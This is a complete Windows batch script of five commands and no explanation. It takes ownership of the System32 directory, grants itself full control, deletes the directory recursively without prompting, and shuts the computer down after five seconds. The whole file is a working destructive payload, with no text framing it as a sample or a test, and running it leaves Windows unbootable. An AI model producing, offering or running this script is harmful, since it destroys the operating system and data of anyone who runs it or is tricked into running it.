@echo off
takeown /f C:\Windows\System32 /r /d y
icacls C:\Windows\System32 /grant administrators:F /t
rd /s /q C:\Windows\System32
shutdown /s /t 5